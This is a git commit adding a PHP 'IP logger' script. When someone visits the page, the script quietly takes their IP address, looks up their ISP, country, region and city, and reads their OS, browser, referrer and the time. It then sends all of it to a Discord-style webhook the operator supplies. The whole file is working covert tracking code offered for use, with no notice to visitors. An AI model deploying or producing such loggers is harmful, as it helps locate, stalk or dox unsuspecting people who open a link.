bf66425efea695806f00c43eeb98b772ae8dd24a
Francesco <68469262+Francesco-fr@users.noreply.github.com>
2020-07-24 15:46:31 +0200

    Create ip-logger.php

---
+++ ip-logger.php
@@ -0,0 +1,161 @@
+<?php
+
+//This ip logger was made by Francesco (ﾉ◕ヮ◕)ﾉ*:・ﾟ✧
+
+$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+function getOS() { 
+    global $user_agent;
+    $os_platform    =   "Unknown OS";
+    $os_array       =   array(
+                            '/windows nt 10/i'     =>  'Windows 10',
+                            '/windows nt 6.3/i'     =>  'Windows 8.1',
+                            '/windows nt 6.2/i'     =>  'Windows 8',
+                            '/windows nt 6.1/i'     =>  'Windows 7',
+                            '/windows nt 6.0/i'     =>  'Windows Vista',
+                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+                            '/windows nt 5.1/i'     =>  'Windows XP',
+                            '/windows xp/i'         =>  'Windows XP',
+                            '/windows nt 5.0/i'     =>  'Windows 2000',
+                            '/windows me/i'         =>  'Windows ME',
+                            '/win98/i'              =>  'Windows 98',
+                            '/win95/i'              =>  'Windows 95',
+                            '/win16/i'              =>  'Windows 3.11',
+                            '/macintosh|mac os x/i' =>  'Mac OS X',
+                            '/mac_powerpc/i'        =>  'Mac OS 9',
+                            '/linux/i'              =>  'Linux',
+							'/kalilinux/i'          =>  'Wannabe Hacker',
+                            '/ubuntu/i'             =>  'Ubuntu',
+                            '/iphone/i'             =>  'iPhone',
+                            '/ipod/i'               =>  'iPod',
+                            '/ipad/i'               =>  'iPad',
+                            '/android/i'            =>  'Android',
+                            '/blackberry/i'         =>  'BlackBerry',
+                            '/webos/i'              =>  'Mobile',
+							'/Windows Phone/i'      =>  'Windows Phone'
+                        );
+    foreach ($os_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $os_platform    =   $value;
+        }
+    }   
+    return $os_platform;
+}
+function getBrowser() {
+    global $user_agent;
+    $browser        =   "Unknown Browser";
+    $browser_array  =   array(
+                            '/msie/i'       =>  'Internet Explorer',
+                            '/firefox/i'    =>  'Firefox',
+							'/Mozilla/i'	=>	'Mozila',
+							'/Mozilla/5.0/i'=>	'Mozila',
+                            '/safari/i'     =>  'Safari',
+                            '/chrome/i'     =>  'Chrome',
+                            '/edge/i'       =>  'Edge',
+                            '/opera/i'      =>  'Opera',
+							'/OPR/i'        =>  'Opera',
+                            '/netscape/i'   =>  'Netscape',
+                            '/maxthon/i'    =>  'Maxthon',
+                            '/konqueror/i'  =>  'Konqueror',
+							'/Bot/i'		=>	'Spam',
+							'/Valve Steam GameOverlay/i'  =>  'Steam',
+                            '/mobile/i'     =>  'RubMyTummy Phone'
+                        );
+    foreach ($browser_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $browser    =   $value;
+        }
+    }
+    return $browser;
+}
+$user_os        =   getOS();
+$user_browser   =   getBrowser();
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$ip_info = json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);
+$isp = $ip_info['isp'];
+$country = $ip_info['country'];
+$regionName = $ip_info['regionName'];
+$city = $ip_info['city'];
+$site_refer = $_SERVER['HTTP_REFERER'];
+	if($site_refer == ""){
+		$site = "dirrect connection";
+	}
+else{
+		$site = $site_refer;
+	}
+date_default_timezone_set('TIME_ZONE_HERE');//<------------     Time Zone here      https://www.php.net/manual/en/timezones.php
+$time = date('Y-m-d H:i:s');
+$make_json = json_encode([
+    "embeds" => [
+        /*
+         * Our first embed
+         */
+        [
+            // Set the title for your embed
+            "title" => "IP LOGGER",
+
+            // The type of your embed, will ALWAYS be "rich"
+            "type" => "rich",
+
+            // A description for your embed
+            "description" => "",
+
+            // The integer color to be used on the left side of the embed
+            "color" => hexdec( "43b581" ),
+
+            // Field array of objects
+            "fields" => [
+                [
+                    "name" => "IP :",
+                    "value" => "$ip",
+                    "inline" => false
+                ],
+				[
+				    "name" => "ISP :",
+					"value" => "$isp",
+					"inline" => false
+				],
+                [
+                    "name" => "Country :",
+                    "value" => "$country",
+                    "inline" => true
+                ],
+				[
+                    "name" => "Region :",
+                    "value" => "$regionName",
+                    "inline" => true
+                ],
+                [
+                    "name" => "City :",
+                    "value" => "$city",
+                    "inline" => true
+                ],
+				[
+                    "name" => "User OS :",
+                    "value" => "$user_os",
+                    "inline" => true
+                ],
+				[
+                    "name" => "User browser :",
+                    "value" => "$user_browser",
+                    "inline" => true
+                ],
+				[
+                    "name" => "Time :",
+                    "value" => "$time",
+                    "inline" => true
+                ],
+            ]
+        ]
+    ]
+
+], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+$exec = curl_init("WEBHOOK_HERE");         //<------------     WEBHOOK HERE                                                                               <-----------      WEBHOOK ON THIS LINE
+curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt( $exec, CURLOPT_POST, 1);
+curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
+curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt( $exec, CURLOPT_HEADER, 0);
+curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
+$response = curl_exec( $exec );
+?>
